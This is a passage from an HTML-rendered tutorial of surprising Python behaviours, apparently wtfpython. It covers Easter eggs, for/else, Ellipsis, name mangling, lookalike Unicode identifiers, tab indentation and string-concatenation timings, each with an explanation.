&#xA;&lt;!-- Example ID: 6427fae6-e959-462d-85da-ce4c94ce41be ---&gt; &#xA;&lt;p&gt;&lt;strong&gt;Output (Python 3.x)&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;&amp;gt;&amp;gt;&amp;gt; from __future__ import barry_as_FLUFL&#xA;&amp;gt;&amp;gt;&amp;gt; &#34;Ruby&#34; != &#34;Python&#34; # there&#39;s no doubt about it&#xA;  File &#34;some_file.py&#34;, line 1&#xA;    &#34;Ruby&#34; != &#34;Python&#34;&#xA;              ^&#xA;SyntaxError: invalid syntax&#xA;&#xA;&amp;gt;&amp;gt;&amp;gt; &#34;Ruby&#34; &amp;lt;&amp;gt; &#34;Python&#34;&#xA;True&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;There we go.&lt;/p&gt; &#xA;&lt;h4&gt;💡 Explanation:&lt;/h4&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt; &lt;p&gt;This is relevant to &lt;a href=&#34;https://www.python.org/dev/peps/pep-0401/&#34;&gt;PEP-401&lt;/a&gt; released on April 1, 2009 (now you know, what it means).&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;Quoting from the PEP-401&lt;/p&gt; &#xA;  &lt;blockquote&gt; &#xA;   &lt;p&gt;Recognized that the != inequality operator in Python 3.0 was a horrible, finger-pain inducing mistake, the FLUFL reinstates the &amp;lt;&amp;gt; diamond operator as the sole spelling.&lt;/p&gt; &#xA;  &lt;/blockquote&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;There were more things that Uncle Barry had to share in the PEP; you can read them &lt;a href=&#34;https://www.python.org/dev/peps/pep-0401/&#34;&gt;here&lt;/a&gt;.&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;It works well in an interactive environment, but it will raise a &lt;code&gt;SyntaxError&lt;/code&gt; when you run via python file (see this &lt;a href=&#34;https://github.com/satwikkansal/wtfpython/issues/94&#34;&gt;issue&lt;/a&gt;). However, you can wrap the statement inside an &lt;code&gt;eval&lt;/code&gt; or &lt;code&gt;compile&lt;/code&gt; to get it working,&lt;/p&gt; &lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;from __future__ import barry_as_FLUFL&#xA;print(eval(&#39;&#34;Ruby&#34; &amp;lt;&amp;gt; &#34;Python&#34;&#39;))&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;hr&gt; &#xA;&lt;h3&gt;▶ Even Python understands that love is complicated&lt;/h3&gt; &#xA;&lt;!-- Example ID: b93cad9e-d341-45d1-999c-fcdce65bed25 ---&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;import this&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Wait, what&#39;s &lt;strong&gt;this&lt;/strong&gt;? &lt;code&gt;this&lt;/code&gt; is love &lt;span&gt;❤️&lt;/span&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;Output:&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;The Zen of Python, by Tim Peters&#xA;&#xA;Beautiful is better than ugly.&#xA;Explicit is better than implicit.&#xA;Simple is better than complex.&#xA;Complex is better than complicated.&#xA;Flat is better than nested.&#xA;Sparse is better than dense.&#xA;Readability counts.&#xA;Special cases aren&#39;t special enough to break the rules.&#xA;Although practicality beats purity.&#xA;Errors should never pass silently.&#xA;Unless explicitly silenced.&#xA;In the face of ambiguity, refuse the temptation to guess.&#xA;There should be one-- and preferably only one --obvious way to do it.&#xA;Although that way may not be obvious at first unless you&#39;re Dutch.&#xA;Now is better than never.&#xA;Although never is often better than *right* now.&#xA;If the implementation is hard to explain, it&#39;s a bad idea.&#xA;If the implementation is easy to explain, it may be a good idea.&#xA;Namespaces are one honking great idea -- let&#39;s do more of those!&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;It&#39;s the Zen of Python!&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;&amp;gt;&amp;gt;&amp;gt; love = this&#xA;&amp;gt;&amp;gt;&amp;gt; this is love&#xA;True&#xA;&amp;gt;&amp;gt;&amp;gt; love is True&#xA;False&#xA;&amp;gt;&amp;gt;&amp;gt; love is False&#xA;False&#xA;&amp;gt;&amp;gt;&amp;gt; love is not True or False&#xA;True&#xA;&amp;gt;&amp;gt;&amp;gt; love is not True or False; love is love  # Love is complicated&#xA;True&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h4&gt;💡 Explanation:&lt;/h4&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;code&gt;this&lt;/code&gt; module in Python is an easter egg for The Zen Of Python (&lt;a href=&#34;https://www.python.org/dev/peps/pep-0020&#34;&gt;PEP 20&lt;/a&gt;).&lt;/li&gt; &#xA; &lt;li&gt;And if you think that&#39;s already interesting enough, check out the implementation of &lt;a href=&#34;https://hg.python.org/cpython/file/c3896275c0f6/Lib/this.py&#34;&gt;this.py&lt;/a&gt;. Interestingly, &lt;strong&gt;the code for the Zen violates itself&lt;/strong&gt; (and that&#39;s probably the only place where this happens).&lt;/li&gt; &#xA; &lt;li&gt;Regarding the statement &lt;code&gt;love is not True or False; love is love&lt;/code&gt;, ironic but it&#39;s self-explanatory (if not, please see the examples related to &lt;code&gt;is&lt;/code&gt; and &lt;code&gt;is not&lt;/code&gt; operators).&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;hr&gt; &#xA;&lt;h3&gt;▶ Yes, it exists!&lt;/h3&gt; &#xA;&lt;!-- Example ID: 4286db3d-1ea7-47c9-8fb6-a9a04cac6e49 ---&gt; &#xA;&lt;p&gt;&lt;strong&gt;The &lt;code&gt;else&lt;/code&gt; clause for loops.&lt;/strong&gt; One typical example might be:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;  def does_exists_num(l, to_find):&#xA;      for num in l:&#xA;          if num == to_find:&#xA;              print(&#34;Exists!&#34;)&#xA;              break&#xA;      else:&#xA;          print(&#34;Does not exist&#34;)&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;strong&gt;Output:&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;&amp;gt;&amp;gt;&amp;gt; some_list = [1, 2, 3, 4, 5]&#xA;&amp;gt;&amp;gt;&amp;gt; does_exists_num(some_list, 4)&#xA;Exists!&#xA;&amp;gt;&amp;gt;&amp;gt; does_exists_num(some_list, -1)&#xA;Does not exist&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;strong&gt;The &lt;code&gt;else&lt;/code&gt; clause in exception handling.&lt;/strong&gt; An example,&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;try:&#xA;    pass&#xA;except:&#xA;    print(&#34;Exception occurred!!!&#34;)&#xA;else:&#xA;    print(&#34;Try block executed successfully...&#34;)&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;strong&gt;Output:&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;Try block executed successfully...&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h4&gt;💡 Explanation:&lt;/h4&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;The &lt;code&gt;else&lt;/code&gt; clause after a loop is executed only when there&#39;s no explicit &lt;code&gt;break&lt;/code&gt; after all the iterations. You can think of it as a &#34;nobreak&#34; clause.&lt;/li&gt; &#xA; &lt;li&gt;&lt;code&gt;else&lt;/code&gt; clause after a try block is also called &#34;completion clause&#34; as reaching the &lt;code&gt;else&lt;/code&gt; clause in a &lt;code&gt;try&lt;/code&gt; statement means that the try block actually completed successfully.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;hr&gt; &#xA;&lt;h3&gt;▶ Ellipsis *&lt;/h3&gt; &#xA;&lt;!-- Example ID: 969b7100-ab3d-4a7d-ad7d-a6be16181b2b ---&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;def some_func():&#xA;    Ellipsis&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;strong&gt;Output&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;&amp;gt;&amp;gt;&amp;gt; some_func()&#xA;# No output, No Error&#xA;&#xA;&amp;gt;&amp;gt;&amp;gt; SomeRandomString&#xA;Traceback (most recent call last):&#xA;  File &#34;&amp;lt;stdin&amp;gt;&#34;, line 1, in &amp;lt;module&amp;gt;&#xA;NameError: name &#39;SomeRandomString&#39; is not defined&#xA;&#xA;&amp;gt;&amp;gt;&amp;gt; Ellipsis&#xA;Ellipsis&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h4&gt;💡 Explanation&lt;/h4&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;In Python, &lt;code&gt;Ellipsis&lt;/code&gt; is a globally available built-in object which is equivalent to &lt;code&gt;...&lt;/code&gt;. &lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;&amp;gt;&amp;gt;&amp;gt; ...&#xA;Ellipsis&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;li&gt;Ellipsis can be used for several purposes, &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;As a placeholder for code that hasn&#39;t been written yet (just like &lt;code&gt;pass&lt;/code&gt; statement)&lt;/li&gt; &#xA;   &lt;li&gt;In slicing syntax to represent the full slices in remaining direction&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;&amp;gt;&amp;gt;&amp;gt; import numpy as np&#xA;&amp;gt;&amp;gt;&amp;gt; three_dimensional_array = np.arange(8).reshape(2, 2, 2)&#xA;array([&#xA;    [&#xA;        [0, 1],&#xA;        [2, 3]&#xA;    ],&#xA;&#xA;    [&#xA;        [4, 5],&#xA;        [6, 7]&#xA;    ]&#xA;])&#xA;&lt;/code&gt;&lt;/pre&gt; So our &lt;code&gt;three_dimensional_array&lt;/code&gt; is an array of array of arrays. Let&#39;s say we want to print the second element (index &lt;code&gt;1&lt;/code&gt;) of all the innermost arrays, we can use Ellipsis to bypass all the preceding dimensions &lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;&amp;gt;&amp;gt;&amp;gt; three_dimensional_array[:,:,1]&#xA;array([[1, 3],&#xA;   [5, 7]])&#xA;&amp;gt;&amp;gt;&amp;gt; three_dimensional_array[..., 1] # using Ellipsis.&#xA;array([[1, 3],&#xA;   [5, 7]])&#xA;&lt;/code&gt;&lt;/pre&gt; Note: this will work for any number of dimensions. You can even select slice in first and last dimension and ignore the middle ones this way (&lt;code&gt;n_dimensional_array[firs_dim_slice, ..., last_dim_slice]&lt;/code&gt;) &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;In &lt;a href=&#34;https://docs.python.org/3/library/typing.html&#34;&gt;type hinting&lt;/a&gt; to indicate only a part of the type (like &lt;code&gt;(Callable[..., int]&lt;/code&gt; or &lt;code&gt;Tuple[str, ...]&lt;/code&gt;))&lt;/li&gt; &#xA;   &lt;li&gt;You may also use Ellipsis as a default function argument (in the cases when you want to differentiate between the &#34;no argument passed&#34; and &#34;None value passed&#34; scenarios).&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;hr&gt; &#xA;&lt;h3&gt;▶ Inpinity&lt;/h3&gt; &#xA;&lt;!-- Example ID: ff473ea8-a3b1-4876-a6f0-4378aff790c1 ---&gt; &#xA;&lt;p&gt;The spelling is intended. Please, don&#39;t submit a patch for this.&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;Output (Python 3.x):&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;&amp;gt;&amp;gt;&amp;gt; infinity = float(&#39;infinity&#39;)&#xA;&amp;gt;&amp;gt;&amp;gt; hash(infinity)&#xA;314159&#xA;&amp;gt;&amp;gt;&amp;gt; hash(float(&#39;-inf&#39;))&#xA;-314159&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h4&gt;💡 Explanation:&lt;/h4&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Hash of infinity is 10⁵ x π.&lt;/li&gt; &#xA; &lt;li&gt;Interestingly, the hash of &lt;code&gt;float(&#39;-inf&#39;)&lt;/code&gt; is &#34;-10⁵ x π&#34; in Python 3, whereas &#34;-10⁵ x e&#34; in Python 2.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;hr&gt; &#xA;&lt;h3&gt;▶ Let&#39;s mangle&lt;/h3&gt; &#xA;&lt;!-- Example ID: 37146d2d-9e67-43a9-8729-3c17934b910c ---&gt; &#xA;&lt;p&gt;1.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;class Yo(object):&#xA;    def __init__(self):&#xA;        self.__honey = True&#xA;        self.bro = True&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;strong&gt;Output:&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;&amp;gt;&amp;gt;&amp;gt; Yo().bro&#xA;True&#xA;&amp;gt;&amp;gt;&amp;gt; Yo().__honey&#xA;AttributeError: &#39;Yo&#39; object has no attribute &#39;__honey&#39;&#xA;&amp;gt;&amp;gt;&amp;gt; Yo()._Yo__honey&#xA;True&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;2.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;class Yo(object):&#xA;    def __init__(self):&#xA;        # Let&#39;s try something symmetrical this time&#xA;        self.__honey__ = True&#xA;        self.bro = True&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;strong&gt;Output:&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;&amp;gt;&amp;gt;&amp;gt; Yo().bro&#xA;True&#xA;&#xA;&amp;gt;&amp;gt;&amp;gt; Yo()._Yo__honey__&#xA;Traceback (most recent call last):&#xA;  File &#34;&amp;lt;stdin&amp;gt;&#34;, line 1, in &amp;lt;module&amp;gt;&#xA;AttributeError: &#39;Yo&#39; object has no attribute &#39;_Yo__honey__&#39;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Why did &lt;code&gt;Yo()._Yo__honey&lt;/code&gt; work?&lt;/p&gt; &#xA;&lt;p&gt;3.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;_A__variable = &#34;Some value&#34;&#xA;&#xA;class A(object):&#xA;    def some_func(self):&#xA;        return __variable # not initialized anywhere yet&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;strong&gt;Output:&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;&amp;gt;&amp;gt;&amp;gt; A().__variable&#xA;Traceback (most recent call last):&#xA;  File &#34;&amp;lt;stdin&amp;gt;&#34;, line 1, in &amp;lt;module&amp;gt;&#xA;AttributeError: &#39;A&#39; object has no attribute &#39;__variable&#39;&#xA;&#xA;&amp;gt;&amp;gt;&amp;gt; A().some_func()&#xA;&#39;Some value&#39;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h4&gt;💡 Explanation:&lt;/h4&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://en.wikipedia.org/wiki/Name_mangling&#34;&gt;Name Mangling&lt;/a&gt; is used to avoid naming collisions between different namespaces.&lt;/li&gt; &#xA; &lt;li&gt;In Python, the interpreter modifies (mangles) the class member names starting with &lt;code&gt;__&lt;/code&gt; (double underscore a.k.a &#34;dunder&#34;) and not ending with more than one trailing underscore by adding &lt;code&gt;_NameOfTheClass&lt;/code&gt; in front.&lt;/li&gt; &#xA; &lt;li&gt;So, to access &lt;code&gt;__honey&lt;/code&gt; attribute in the first snippet, we had to append &lt;code&gt;_Yo&lt;/code&gt; to the front, which would prevent conflicts with the same name attribute defined in any other class.&lt;/li&gt; &#xA; &lt;li&gt;But then why didn&#39;t it work in the second snippet? Because name mangling excludes the names ending with double underscores.&lt;/li&gt; &#xA; &lt;li&gt;The third snippet was also a consequence of name mangling. The name &lt;code&gt;__variable&lt;/code&gt; in the statement &lt;code&gt;return __variable&lt;/code&gt; was mangled to &lt;code&gt;_A__variable&lt;/code&gt;, which also happens to be the name of the variable we declared in the outer scope.&lt;/li&gt; &#xA; &lt;li&gt;Also, if the mangled name is longer than 255 characters, truncation will happen.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;hr&gt; &#xA;&lt;hr&gt; &#xA;&lt;h2&gt;Section: Appearances are deceptive!&lt;/h2&gt; &#xA;&lt;h3&gt;▶ Skipping lines?&lt;/h3&gt; &#xA;&lt;!-- Example ID: d50bbde1-fb9d-4735-9633-3444b9d2f417 ---&gt; &#xA;&lt;p&gt;&lt;strong&gt;Output:&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;&amp;gt;&amp;gt;&amp;gt; value = 11&#xA;&amp;gt;&amp;gt;&amp;gt; valuе = 32&#xA;&amp;gt;&amp;gt;&amp;gt; value&#xA;11&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Wut?&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;Note:&lt;/strong&gt; The easiest way to reproduce this is to simply copy the statements from the above snippet and paste them into your file/shell.&lt;/p&gt; &#xA;&lt;h4&gt;💡 Explanation&lt;/h4&gt; &#xA;&lt;p&gt;Some non-Western characters look identical to letters in the English alphabet but are considered distinct by the interpreter.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;&amp;gt;&amp;gt;&amp;gt; ord(&#39;е&#39;) # cyrillic &#39;e&#39; (Ye)&#xA;1077&#xA;&amp;gt;&amp;gt;&amp;gt; ord(&#39;e&#39;) # latin &#39;e&#39;, as used in English and typed using standard keyboard&#xA;101&#xA;&amp;gt;&amp;gt;&amp;gt; &#39;е&#39; == &#39;e&#39;&#xA;False&#xA;&#xA;&amp;gt;&amp;gt;&amp;gt; value = 42 # latin e&#xA;&amp;gt;&amp;gt;&amp;gt; valuе = 23 # cyrillic &#39;e&#39;, Python 2.x interpreter would raise a `SyntaxError` here&#xA;&amp;gt;&amp;gt;&amp;gt; value&#xA;42&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;The built-in &lt;code&gt;ord()&lt;/code&gt; function returns a character&#39;s Unicode &lt;a href=&#34;https://en.wikipedia.org/wiki/Code_point&#34;&gt;code point&lt;/a&gt;, and different code positions of Cyrillic &#39;e&#39; and Latin &#39;e&#39; justify the behavior of the above example.&lt;/p&gt; &#xA;&lt;hr&gt; &#xA;&lt;h3&gt;▶ Teleportation&lt;/h3&gt; &#xA;&lt;!-- Example ID: edafe923-0c20-4315-b6e1-0c31abfc38f5 ---&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;# `pip install numpy` first.&#xA;import numpy as np&#xA;&#xA;def energy_send(x):&#xA;    # Initializing a numpy array&#xA;    np.array([float(x)])&#xA;&#xA;def energy_receive():&#xA;    # Return an empty numpy array&#xA;    return np.empty((), dtype=np.float).tolist()&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;strong&gt;Output:&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;&amp;gt;&amp;gt;&amp;gt; energy_send(123.456)&#xA;&amp;gt;&amp;gt;&amp;gt; energy_receive()&#xA;123.456&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Where&#39;s the Nobel Prize?&lt;/p&gt; &#xA;&lt;h4&gt;💡 Explanation:&lt;/h4&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Notice that the numpy array created in the &lt;code&gt;energy_send&lt;/code&gt; function is not returned, so that memory space is free to reallocate.&lt;/li&gt; &#xA; &lt;li&gt;&lt;code&gt;numpy.empty()&lt;/code&gt; returns the next free memory slot without reinitializing it. This memory spot just happens to be the same one that was just freed (usually, but not always).&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;hr&gt; &#xA;&lt;h3&gt;▶ Well, something is fishy...&lt;/h3&gt; &#xA;&lt;!-- Example ID: cb6a37c5-74f7-44ca-b58c-3b902419b362 ---&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;def square(x):&#xA;    &#34;&#34;&#34;&#xA;    A simple function to calculate the square of a number by addition.&#xA;    &#34;&#34;&#34;&#xA;    sum_so_far = 0&#xA;    for counter in range(x):&#xA;        sum_so_far = sum_so_far + x&#xA;  return sum_so_far&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;strong&gt;Output (Python 2.x):&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;&amp;gt;&amp;gt;&amp;gt; square(10)&#xA;10&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Shouldn&#39;t that be 100?&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;Note:&lt;/strong&gt; If you&#39;re not able to reproduce this, try running the file &lt;a href=&#34;https://raw.githubusercontent.com/satwikkansal/wtfpython/master/mixed_tabs_and_spaces.py&#34;&gt;mixed_tabs_and_spaces.py&lt;/a&gt; via the shell.&lt;/p&gt; &#xA;&lt;h4&gt;💡 Explanation&lt;/h4&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt; &lt;p&gt;&lt;strong&gt;Don&#39;t mix tabs and spaces!&lt;/strong&gt; The character just preceding return is a &#34;tab&#34;, and the code is indented by multiple of &#34;4 spaces&#34; elsewhere in the example.&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;This is how Python handles tabs:&lt;/p&gt; &#xA;  &lt;blockquote&gt; &#xA;   &lt;p&gt;First, tabs are replaced (from left to right) by one to eight spaces such that the total number of characters up to and including the replacement is a multiple of eight &amp;lt;...&amp;gt;&lt;/p&gt; &#xA;  &lt;/blockquote&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;So the &#34;tab&#34; at the last line of &lt;code&gt;square&lt;/code&gt; function is replaced with eight spaces, and it gets into the loop.&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;Python 3 is kind enough to throw an error for such cases automatically.&lt;/p&gt; &lt;p&gt;&lt;strong&gt;Output (Python 3.x):&lt;/strong&gt;&lt;/p&gt; &lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;TabError: inconsistent use of tabs and spaces in indentation&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;hr&gt; &#xA;&lt;hr&gt; &#xA;&lt;h2&gt;Section: Miscellaneous&lt;/h2&gt; &#xA;&lt;h3&gt;▶ &lt;code&gt;+=&lt;/code&gt; is faster&lt;/h3&gt; &#xA;&lt;!-- Example ID: bfd19c60-a807-4a26-9598-4912b86ddb36 ---&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;# using &#34;+&#34;, three strings:&#xA;&amp;gt;&amp;gt;&amp;gt; timeit.timeit(&#34;s1 = s1 + s2 + s3&#34;, setup=&#34;s1 = &#39; &#39; * 100000; s2 = &#39; &#39; * 100000; s3 = &#39; &#39; * 100000&#34;, number=100)&#xA;0.25748300552368164&#xA;# using &#34;+=&#34;, three strings:&#xA;&amp;gt;&amp;gt;&amp;gt; timeit.timeit(&#34;s1 += s2 + s3&#34;, setup=&#34;s1 = &#39; &#39; * 100000; s2 = &#39; &#39; * 100000; s3 = &#39; &#39; * 100000&#34;, number=100)&#xA;0.012188911437988281&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h4&gt;💡 Explanation:&lt;/h4&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;code&gt;+=&lt;/code&gt; is faster than &lt;code&gt;+&lt;/code&gt; for concatenating more than two strings because the first string (example, &lt;code&gt;s1&lt;/code&gt; for &lt;code&gt;s1 += s2 + s3&lt;/code&gt;) is not destroyed while calculating the complete string.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;hr&gt; &#xA;&lt;h3&gt;▶ Let&#39;s make a giant string!&lt;/h3&gt; &#xA;&lt;!-- Example ID: c7a07424-63fe-4504-9842-8f3d334f28fc ---&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;def add_string_with_plus(iters):&#xA;    s = &#34;&#34;&#xA;    for i in range(iters):&#xA;        s += &#34;xyz&#34;&#xA;    assert len(s) == 3*iters&#xA;&#xA;def add_bytes_with_plus(iters):&#xA;    s = b&#34;&#34;&#xA;    for i in range(iters):&#xA;        s += b&#34;xyz&#34;&#xA;    assert len(s) == 3*iters&#xA;&#xA;def add_string_with_format(iters):&#xA;    fs = &#34;{}&#34;*iters&#xA;    s = fs.format(*([&#34;xyz&#34;]*iters))&#xA;    assert len(s) == 3*iters&#xA;&#xA;def add_string_with_join(iters):&#xA;    l = []&#xA;    for i in range(iters):&#xA;        l.append(&#34;xyz&#34;)&#xA;    s = &#34;&#34;.join(l)&#xA;    assert len(s) == 3*iters&#xA;&#xA;def convert_list_to_string(l, iters):&#xA;    s = &#34;&#34;.join(l)&#xA;    assert len(s) == 3*iters&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;strong&gt;Output:&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;# Executed in ipython shell using %timeit for better readability of results.&#xA;# You can also use the timeit module in normal python shell/scriptm=, example usage below&#xA;# timeit.timeit(&#39;add_string_with_plus(10000)&#39;, number=1000, globals=globals())&#xA;&#xA;&amp;gt;&amp;gt;&amp;gt; NUM_ITERS = 1000&#xA;&amp;gt;&amp;gt;&amp;gt; %timeit -n1000 add_string_with_plus(NUM_ITERS)&#xA;124 µs ± 4.73 µs per loop (mean ± std. dev. of 7 runs, 100 loops each)&#xA;&amp;gt;&amp;gt;&amp;gt; %timeit -n1000 add_bytes_with_plus(NUM_ITERS)&#xA;211 µs ± 10.5 µs per loop (mean ± std. dev. of 7 runs, 1000 loops each)&#xA;&amp;gt;&amp;gt;&amp;gt; %timeit -n1000 add_string_with_format(NUM_ITERS)&#xA;61 µs ± 2.18 µs per loop (mean ± std. dev. of 7 runs, 1000 loops each)&#xA;&amp;gt;&amp;gt;&amp;gt; %timeit -n1000 add_string_with_join(NUM_ITERS)&#xA;117 µs ± 3.21 µs per loop (mean ± std. dev. of 7 runs, 1000 loops each)&#xA;&amp;gt;&amp;gt;&amp;gt; l = [&#34;xyz&#34;]*NUM_ITERS&#xA;&amp;gt;&amp;gt;&amp;gt; %timeit -n1000 convert_list_to_string(l, NUM_ITERS)&#xA;10.1 µs ± 1.06 µs per loop (mean ± std. dev. of 7 runs, 1000 loops each)&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Let&#39;s increase the number of iterations by a factor of 10.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;&amp;gt;&amp;gt;&amp;gt; NUM_ITERS = 10000&#xA;&amp;gt;&amp;gt;&amp;gt; %timeit -n1000 add_string_with_plus(NUM_ITERS) # Linear increase in execution time&#xA;1.26 ms ± 76.8 µs per loop (mean ± std. dev. of 7 runs, 1000 loops each)&#xA;&amp;gt;&amp;gt;&amp;gt; %timeit -n1000 add_bytes_with_plus(NUM_ITERS) # Quadratic increase&#xA;6.82 ms ± 134 µs per loop (mean ± std. dev. of 7 runs, 1000 loops each)&#xA;&amp;gt;&amp;gt;&amp;gt; %timeit -n1000 add_string_with_format(NUM_ITERS) # Linear increase&#xA;645 µs ± 24.5 µs per loop (mean ± std. dev. of 7 runs, 1000 loops each)&#xA;&amp;gt;&amp;gt;&amp;gt; %timeit -n1000 add_string_with_join(NUM_ITERS) # Linear increase&#xA;1.17 ms ± 7.25 µs per loop (mean ± std. dev. of 7 runs, 1000 loops each)&#xA;&amp;gt;&amp;gt;&amp;gt; l = [&#34;xyz&#34;]*NUM_ITERS&#xA;&amp;gt;&amp;gt;&amp;gt; %timeit -n1000 convert_list_to_string(l, NUM_ITERS) # Linear increase&#xA;86.3 µs ± 2 µs per loop (mean ± std. dev. of 7 runs, 1000 loops each)&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h4&gt;💡 Explanation&lt;/h4&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt; &lt;p&gt;You can read more about &lt;a href=&#34;https://docs.python.org/3/library/timeit.html&#34;&gt;timeit&lt;/a&gt; or &lt;a href=&#34;https://ipython.org/ipython-doc/dev/interactive/magics.html#magic-timeit&#34;&gt;%timeit&lt;/a&gt; on these links. They are used to measure the execution time of code pieces.&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; 